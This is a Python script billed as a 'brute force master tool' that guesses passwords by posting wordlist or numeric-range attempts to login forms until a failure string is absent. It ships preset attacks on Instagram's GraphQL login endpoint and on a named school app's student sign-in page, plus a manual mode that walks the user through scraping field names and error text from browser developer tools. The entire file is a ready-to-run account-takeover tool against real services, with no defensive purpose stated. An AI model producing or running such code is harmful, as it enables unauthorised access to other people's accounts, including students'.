import requests
import re
import time
from rich import print
from rich.panel import Panel
from rich.align import Align
from rich.console import Console

console = Console()

def parse_field_tag(tag_input: str) -> str:
    """
    Extracts identification from HTML tag.
    Priority: 1. name | 2. class | 3. placeholder
    """
    tag_input = tag_input.strip()
    
    # 1. Try Name
    name_match = re.search(r'name\s*=\s*["\']([^"\']+)["\']', tag_input, re.I)
    if name_match:
        return name_match.group(1)
    
    # 2. Try Class
    class_match = re.search(r'class\s*=\s*["\']([^"\']+)["\']', tag_input, re.I)
    if class_match:
        # If multiple classes exist, take the first one
        return class_match.group(1).split()[0]
    
    # 3. Try Placeholder
    place_match = re.search(r'placeholder\s*=\s*["\']([^"\']+)["\']', tag_input, re.I)
    if place_match:
        return place_match.group(1)
    
    # Fallback to the raw input if it's just a string
    return tag_input

def get_brute_type():
    print("\n[bold yellow]Select Attack Method:[/bold yellow]")
    print("[1] Wordlist (File Path)")
    print("[2] Ranged Loop (Numeric)")
    return input("Choice: ")

def start_attack(url, username, field_names, brute_type, failure_msg, custom_headers=None):
    u_field, p_field = field_names
    passwords = []

    if brute_type == "1":
        path = input("Enter Wordlist Path: ")
        try:
            with open(path, 'r') as f:
                passwords = [line.strip() for line in f]
        except FileNotFoundError:
            print("[bold red]File not found![/bold red]")
            return
    else:
        start = int(input("Start Range: "))
        end = int(input("End Range: "))
        passwords = [str(i) for i in range(start, end + 1)]

    print(f"\n[bold cyan]Target:[/bold cyan] {url}")
    print(f"[bold cyan]Field Mapping:[/bold cyan] {u_field} & {p_field}\n")
    
    session = requests.Session()
    for pwd in passwords:
        payload = {u_field: username, p_field: pwd}
        try:
            headers = custom_headers if custom_headers else {"User-Agent": "Mozilla/5.0"}
            response = session.post(url, data=payload, headers=headers, timeout=10)
            
            # Check if failure message is in the response body
            if failure_msg.lower() in response.text.lower():
                print(f"[red][-] Failed:[/red] {pwd}")
            else:
                print(f"\n[bold green][+] SUCCESS! Password found: {pwd}[/bold green]")
                return # Stop after finding
        except Exception as e:
            print(f"[yellow][!] Error: {e}[/yellow]")
        time.sleep(0.1)

def main():
    console.print(Panel(Align.center("[bold magenta]BRUTE FORCE MASTER TOOL[/bold magenta]")))
    print("[bold #00fc1d]1. Instagram[/bold #00fc1d]")
    print("[bold #00fc1d]2. Nascorp School App[/bold #00fc1d]")
    print("[bold #00fc1d]3. Manual (Custom Target)[/bold #00fc1d]")
    
    choice = input("\nSelect Option: ")

    if choice == "3":
        # Manual Option Logic
        target_url = input("\nEnter Target Login URL: ")
        
        print("\n[bold yellow]Network Tab Guide:[/bold yellow]")
        print("1. Right-click login field -> Inspect. Copy the full <input> tag.")
        u_tag = input("Paste FULL Username HTML tag: ")
        p_tag = input("Paste FULL Password HTML tag: ")
        
        print("\n2. Perform a failed login. Go to Network tab -> Response.")
        fail_msg = input("Paste a unique word from the failure response (e.g. 'Invalid'): ")
        
        username = input("\nEnter target username: ")
        brute_mode = get_brute_type()
        
        # Parse fields with the new hierarchy (Name > Class > Placeholder)
        u_field = parse_field_tag(u_tag)
        p_field = parse_field_tag(p_tag)
        
        start_attack(target_url, username, (u_field, p_field), brute_mode, fail_msg)
    
    elif choice == "1":
        # Instagram Logic
        user = input("Enter IG Username: ")
        b_type = get_brute_type()
        start_attack("https://www.instagram.com/api/graphql", user, ("username", "enc_password"), b_type, "incorrect")

    elif choice == "2":
        # Nascorp Logic
        user = input("Enter Student ID: ")
        b_type = get_brute_type()
        start_attack("https://stem.nascorptechnologies.com/SignIn", user, ("userid", "pwd"), b_type, "Invalid")

if __name__ == "__main__":
    main()